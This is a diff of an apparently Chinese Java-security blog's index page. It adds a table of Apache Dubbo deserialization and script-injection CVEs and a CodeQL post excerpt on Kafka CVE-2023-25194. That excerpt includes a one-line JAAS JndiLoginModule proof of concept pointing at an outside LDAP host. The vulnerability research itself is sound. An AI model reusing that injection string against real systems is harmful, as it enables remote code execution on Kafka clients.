+</tr>
+<tr>
+<td><a href="#0x09-CVE-2021-30180">CVE-2021-30180</a></td>
+<td>1. <a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-7-rce-on-customers-via-tag-route-poisoning-unsafe-yaml-unmarshaling-ghsl-2021-040">GHSL-2021-040</a>/<a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-8-rce-on-customers-via-condition-route-poisoning-unsafe-yaml-unmarshaling-ghsl-2021-041">GHSL-2021-041</a> Dubbo的路由实现支持多种，例如Tag路由、Condition路由，它两都支持动态配置，具体实现是以yml格式写入kafka配置中，再交由consumer去解析，consumer采用的是snakeyaml，存在反序列化漏洞。<br>2. <a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-10-rce-on-providers-via-configuration-poisoning-unsafe-yaml-unmarshaling-ghsl-2021-043">GHSL-2021-043</a>: Dubbo还支持动态配置，原理与router config类似，不过是由provider来加载，最终调用snakeyaml实现反序列化。</td>
+<td>2.7.0&lt;=Dubbo&lt;=2.7.9<br>2.6.0&lt;=Dubbo&lt;=2.6.9<br>2.5.x</td>
+<td><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve">Alvaro Munoz@GitHub Security Lab</a></td>
+</tr>
+<tr>
+<td><a href="#0x10-CVE-2021-30181">CVE-2021-30181</a></td>
+<td><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-9-rce-on-customers-via-script-route-poisoning-nashorn-script-injection-ghsl-2021-042">GHSL-2021-042</a> 与上一个漏洞类似，还支持Script路由，Script引擎用的Nashorn，存在命令执行</td>
+<td>2.7.0&lt;=Dubbo&lt;=2.7.9<br>2.6.0&lt;=Dubbo&lt;=2.6.9<br>2.5.x</td>
+<td><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve">Alvaro Munoz@GitHub Security Lab</a></td>
+</tr>
+<tr>
+<td><a href="#0x11-CVE-2021-36162">CVE-2021-36162</a></td>
+<td><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-094-096-apache-dubbo/#issue-1-rce-on-customers-via-tag-route-poisoning-unsafe-yaml-unmarshaling-ghsl-2021-094">GHSL-2021-094</a> Dubbo在2.7.10中修复了snakeYaml的反序列化问题，但是3.0新Router机制Mesh中依然存在snakeYaml反序列化</td>
+<td>3.0&lt;=Dubbo&lt;=3.0.1<br>2.7.0&lt;=Dubbo&lt;=2.7.12</td>
+<td><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve">Alvaro Munoz@GitHub Security Lab</a></td>
+</tr>
+<tr>
+<td><a href="#0x12-CVE-2021-36163">CVE-2021-36163</a></td>
+<td><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-094-096-apache-dubbo/#issue-2-unsafe-deserialization-in-providers-using-the-hessian-protocol-ghsl-2021-095">GHSL-2021-095</a> Dubbo还支持Hessian协议（并不是指反序列化），基于http，在HessianSkeleton 的处理中会对POST 的内容进行反序列化</td>
+<td>3.0&lt;=Dubbo&lt;=3.0.1<br>2.7.0&lt;=Dubbo&lt;=2.7.12</td>
+<td><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve">Alvaro Munoz@GitHub Security Lab</a></td>
+</tr>
+<tr>
+<td><a href="#0x13-GHSL-2021-096">GHSL-2021-096</a></td>
+<td><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-094-096-apache-dubbo/#issue-3-unsafe-deserialization-in-providers-using-the-rmi-protocol-ghsl-2021-096">GHSL-2021-096</a> Dubbo还支持rmi协议，Dobbo的Provider类似RMI的Register和Provider，可以用Client攻击Register和Provider的方式进行攻击</td>
+<td>3.0&lt;=Dubbo&lt;=3.0.1<br>2.7.0&lt;=Dubbo&lt;=2.7.12</td>
+<td><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve">Alvaro Munoz@GitHub Security Lab</a></td>
+</tr>
+<tr>
+<td><a href="#0x14-CVE-2021-37579">CVE-2021-37579</a></td>
+<td><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-097-apache-dubbo/">GHSL-2021-097</a> CodecSupport#checkSerialization bypass，该安全策略用于判断dubbo数据包指定的序列化方式是否是provider配置的配置，当version不存在时，会绕过检测漏洞</td>
+<td>3.0&lt;=Dubbo&lt;=3.0.1<br>2.7.0&lt;=Dubbo&lt;=2.7.12</td>
+<td><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve">Alvaro Munoz@GitHub Security Lab</a></td>
+</tr>
+<tr>
+<td><a href="#0x15-CVE-2021-43297">CVE-2021-43297</a></td>
+<td>hessian-lite 作为dubbo内置的hessian版本，在处理异常的时候，会通过”+”进行字符串拼接，导致其中obj的toString 隐式调用，形成反序列化(也可以认为是<a href="#0x06-GHSL-2021-036">GHSL-2021-036</a>的补充)</td>
+<td>3.0.0&lt;=Dubbo&lt;=3.0.5<br>2.7.0&lt;=Dubbo&lt;=2.7.15<br>2.6.0&lt;=Dubbo&lt;=2.6.12</td>
+<td><a target="_blank" rel="noopener" href="https://lists.apache.org/thread/1mszxrvp90y01xob56yp002939c7hlww">cxc、yhbl、wh1t3p1g、fynch3r</a></td>
+</tr>
+<tr>
+<td><a href="#0x16-CVE-2023-23638">CVE-2023-23638</a></td>
+<td>CVE-2021-30179的绕过，可以利用setter设置全局静态配置变量，绕过安全规则</td>
+<td>2.7.0&lt;=Dubbo&lt;=2.7.21<br>3.0.0&lt;=Dubbo&lt;=3.0.13<br>3.1.0&lt;=Dubbo&lt;=3.1.5</td>
+<td><a target="_blank" rel="noopener" href="https://lists.apache.org/thread/8h6zscfzj482z512d2v5ft63hdhzm0cb">yemoli、R1ckyZ、Koishi、cxc (reporter)</a></td>
+</tr>
+</tbody></table>
         
-          <a class="article-more-a" href="/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/#more">more >></a>
+          <a class="article-more-a" href="/2023/03/20/Dubbo-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#more">more >></a>
         
       
 
@@ -421,11 +586,7 @@ ga('send', 'pageview');
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CVE</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">XStream</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Dubbo</a>
         		</li>
       		
 		</ul>
@@ -477,31 +638,31 @@ ga('send', 'pageview');
 
 
   
-    <article id="post-Xstream反序列化详解（一）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-CodeQL-分析Apache-Kafka-CVE-2023-25194" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/05/08/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/">XStream反序列化详解（一）</a>
+      <a class="article-title" href="/2023/03/01/CodeQL-%E5%88%86%E6%9E%90Apache-Kafka-CVE-2023-25194/">CodeQL 分析Apache Kafka CVE-2023-25194</a>
     </h1>
   
 
         
-        <a href="/2021/05/08/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/" class="archive-article-date">
-  	<time datetime="2021-05-08T09:17:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-08</time>
+        <a href="/2023/03/01/CodeQL-%E5%88%86%E6%9E%90Apache-Kafka-CVE-2023-25194/" class="archive-article-date">
+  	<time datetime="2023-03-01T08:48:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-03-01</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>XStream 反序列化问题由来已久，从&lt;=1.4.6版本之下的EventHandler利用方式，到20年的CVE-2020-26217，再到21年钟师傅、threedr3am、whit3p1g师傅们不要钱似的6个CVE。它的成因不同于fastjson之类，也有异于原生Java反序列化，很有特点，值得学习。</p>
-<p>本节其实算是Wh1t3p1g师傅《回顾XStream反序列化漏洞》的学习笔记，也试着解释师傅没提到的一些细节问题。</p>
-<h2 id="1-XStream-原理解析"><a href="#1-XStream-原理解析" class="headerlink" title="1. XStream 原理解析"></a>1. XStream 原理解析</h2><h3 id="1-1-源码解析"><a href="#1-1-源码解析" class="headerlink" title="1.1 源码解析"></a>1.1 源码解析</h3><p>参考【3】<br><img src="/images/pasted-136.png" alt="upload successful"></p>
+        <p>CVE-2023-25194 是jaas 的通用问题，如果可以自定义jaas config，就可以触发漏洞。是否能够通过自动化发现该漏洞？如果可能，那么也就可以自动化横向分析类似问题。</p>
+<p>本文假设读者师傅们已经能够简单使用codeql，比如codeql的source\sink概念，以及data-flow污点分析及其isAdditionalTaintStep的使用。</p>
+<h2 id="0x01-CVE-2023-25194"><a href="#0x01-CVE-2023-25194" class="headerlink" title="0x01 CVE-2023-25194"></a>0x01 CVE-2023-25194</h2><p>POC:<br><code>com.sun.security.auth.module.JndiLoginModule required user.provider.url=&quot;ldap://kafka2.1.dns.m0d9.me </code></p>
         
-          <a class="article-more-a" href="/2021/05/08/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/#more">more >></a>
+          <a class="article-more-a" href="/2023/03/01/CodeQL-%E5%88%86%E6%9E%90Apache-Kafka-CVE-2023-25194/#more">more >></a>
         
       
 
@@ -515,11 +676,15 @@ ga('send', 'pageview');
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Java</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CVE</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">XStream</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">CodeQL</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Kafka</a>
         		</li>
       		
 		</ul>
@@ -531,109 +696,7 @@ ga('send', 'pageview');
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/Java安全//" class="article-tag-list-link color2">Java安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-
-  
-    <article id="post-Jdbc碎碎念三：内存数据库" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/04/26/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B8%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93/">Jdbc碎碎念三：内存数据库</a>
-    </h1>
-  
-
-        
-        <a href="/2021/04/26/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B8%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93/" class="archive-article-date">
-  	<time datetime="2021-04-26T06:10:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>继续讨论讨论在jdbc url可控情况下，有哪下攻击手法？</p>
-<ol>
-<li>攻击client思路，典型的就是mysql client，前面讲过</li>
-<li>攻击server思路，内存数据库就是当前server，发现相关介绍文章都比较散，这里尝试探索总结下，看看能不能发现新的姿势</li>
-</ol>
-<h1 id="攻击内存数据库Server"><a href="#攻击内存数据库Server" class="headerlink" title="攻击内存数据库Server"></a>攻击内存数据库Server</h1><h2 id="H2"><a href="#H2" class="headerlink" title="H2"></a>H2</h2><p>pom依赖</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.h2database<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>h2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.199<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-        
-          <a class="article-more-a" href="/2021/04/26/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B8%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Java</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Jdbc</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">H2</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">HSQLDB</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/Java安全//" class="article-tag-list-link color2">Java安全</a>
+        			<a href="/categories/CodeQL//" class="article-tag-list-link color2">CodeQL</a>
         		</li>
       		
 		</ul>
@@ -671,7 +734,7 @@ ga('send', 'pageview');
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">« Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/4/">Next »</a>
+      <a class="extend prev" rel="prev" href="/page/2/">« Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/4/">Next »</a>
     </nav>
   
 
@@ -683,7 +746,7 @@ ga('send', 'pageview');
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2022 m0d9
+    		&copy; 2025 m0d9
     	</div>
       	<div class="footer-right">
       		<!-- <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten -->
@@ -1016,11 +1079,67 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">CobaltStrike</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">IAST</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">DongTai</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Kafka</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Jaas</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CVE-2020-9297</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">BeanValidation</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Dubbo</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CVE-2023-33246</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">RocketMQ</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Tai-e</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ActiveMQ</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CVE-2023-22518</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CVE-2023-46604</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Extractor</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Kylin</a>
               </li>
             
             <div class="clearfix"></div>
